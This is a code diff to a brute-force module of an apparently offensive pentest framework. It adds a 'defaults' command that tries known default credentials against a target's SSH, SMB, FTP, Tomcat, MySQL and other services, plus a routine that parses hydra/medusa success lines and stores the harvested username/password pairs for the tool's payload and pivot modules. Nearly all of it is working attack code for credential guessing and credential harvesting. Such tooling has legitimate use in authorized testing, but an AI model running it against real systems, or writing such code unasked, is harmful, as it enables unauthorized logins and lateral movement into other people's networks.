@@ -40,6 +40,49 @@ class BruteModule(BaseModule):
             "MEDUSA": [medusa_cmd],
         }
 
+    def suggest_commands(self) -> dict:
+        """Hydra one-liners for the auth services already found open."""
+        from phantom.modules.suggest import brute_suggestion_group
+        return brute_suggestion_group()
+
+    def do_defaults(self, arg):
+        """defaults [service] — try the known DEFAULT credentials for a
+        service first (fast, quiet, the senior move before any noise):
+        routers, cameras, NAS, appliances. Found pairs are written to the
+        shared knowledge (usable by payload/pivot and the report)."""
+        if not session.target:
+            notifier.error("No target set. Use 'set target <ip>' first.")
+            return
+        service = arg.strip().lower() or input("  Service (ssh/ftp/smb/http/...): ").strip().lower()
+        if not service:
+            notifier.error("Service required.")
+            return
+        from phantom.automation.exploit.vectors import (
+            OfflineBrute, _builtin_verifiers)
+        verifier = _builtin_verifiers().get(service)
+        if not verifier:
+            notifier.warn(f"No built-in verifier for '{service}' "
+                          "(try ssh/ftp/smb/http/tomcat/mysql/postgresql).")
+            return
+        notifier.status(f"Trying default credentials for {service} on "
+                        f"{session.target}...")
+        brute = OfflineBrute(verifier)
+        port = {"ssh": 22, "smb": 445, "ftp": 21, "winrm": 5985,
+                "http": 80, "tomcat": 8080, "mysql": 3306,
+                "postgresql": 5432}.get(service, 443)
+        res = brute.run(session.target, port, service)
+        if res.credentials:
+            user, pw = res.credentials
+            from phantom.core.knowledge import add_creds
+            add_creds(user, pw, service, valid=True, source="default_creds")
+            notifier.success(f"Default credentials FOUND: {user}:{pw} "
+                             f"({service}) — written to shared knowledge.")
+            notifier.info("Payload/pivot can reuse them; the report lists them.")
+        elif res.error:
+            notifier.warn(f"Default-cred check stopped: {res.error}")
+        else:
+            notifier.info("No default credentials matched. Proceed to wordlist brute.")
+
     def do_run(self, _):
         """Interactive wizard for network brute force."""
         if not session.target:
@@ -79,6 +122,34 @@ class BruteModule(BaseModule):
         notifier.status(f"Starting brute force sequence for {session.target}...")
         results = run_commands(chosen, session.target)
         session.add_result("brute", results)
+        self._harvest_creds(results)
+
+    def _harvest_creds(self, results: dict):
+        """Parse hydra/medusa success lines and write valid pairs to the
+        shared WorldModel so payload/pivot/report can reuse them."""
+        import re
+        from phantom.core.knowledge import add_creds
+        found = 0
+        for output in results.values():
+            for line in (output or "").splitlines():
+                if "login:" in line and "password:" in line:
+                    try:
+                        user = line.split("login:")[1].split()[0].strip()
+                        pw = line.split("password:")[1].split()[0].strip()
+                    except (IndexError, ValueError):
+                        continue
+                    service = (re.search(r"\[(\d+)\]\[(\w+)\]", line)
+                               or [None, None, "auth"])[2]
+                    add_creds(user, pw, service or "auth", valid=True,
+                              source="brute")
+                    notifier.success(
+                        f"Credential harvested: {user}:{pw} ({service}) — "
+                        "written to shared knowledge.")
+                    found += 1
+        if found:
+            notifier.info(
+                f"{found} credential set(s) now in shared knowledge "
+                "(show knowledge).")
 
     def do_crack(self, _):
         """Crack password hashes with John the Ripper or Hashcat."""
@@ -117,6 +188,6 @@ class BruteModule(BaseModule):
         else:
             notifier.warn("Cancelled.")
 
-    def do_preview(self, _):
+    def _execute_flow(self, _):
         """Alias for do_run."""
         self.do_run(_)
